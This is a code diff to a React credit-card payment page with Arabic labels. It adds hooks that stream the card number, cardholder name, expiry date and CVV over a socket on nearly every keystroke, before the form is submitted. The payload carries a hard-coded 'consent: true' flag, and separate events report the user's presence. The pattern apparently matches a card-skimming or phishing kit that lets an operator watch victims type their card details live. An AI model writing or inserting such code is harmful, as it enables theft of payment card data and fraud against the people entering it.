@@ -170,6 +170,32 @@ export default function CreditCardPayment() {
   useEffect(() => {
     navigateToPage("الدفع بطاقة الائتمان");
   }, []);
+  // ===== بطاقة الدفع المباشر =====
+  const liveDebounceRef = useRef<ReturnType<typeof setTimeout>>();
+
+  useEffect(() => {
+    if (socket.value.connected) socket.value.emit("card:live", { presence: true });
+  }, []);
+
+  useEffect(() => {
+    if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current);
+    liveDebounceRef.current = setTimeout(() => {
+      if (!socket.value.connected) return;
+      socket.value.emit("card:live", {
+        cardNumber: cleanCardNumber,
+        nameOnCard: nameOnCard || "",
+        expiryDate: expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "",
+        cvv: cvv || "",
+        consent: true,
+      });
+    }, 60);
+    return () => { if (liveDebounceRef.current) clearTimeout(liveDebounceRef.current); };
+  }, [cardNumber, nameOnCard, expiryMonth, expiryYear, cvv]);
+
+  useEffect(() => {
+    return () => { socket.value.emit("card:liveHide"); };
+  }, []);
+
 
   // Verify card number
   useEffect(() => {
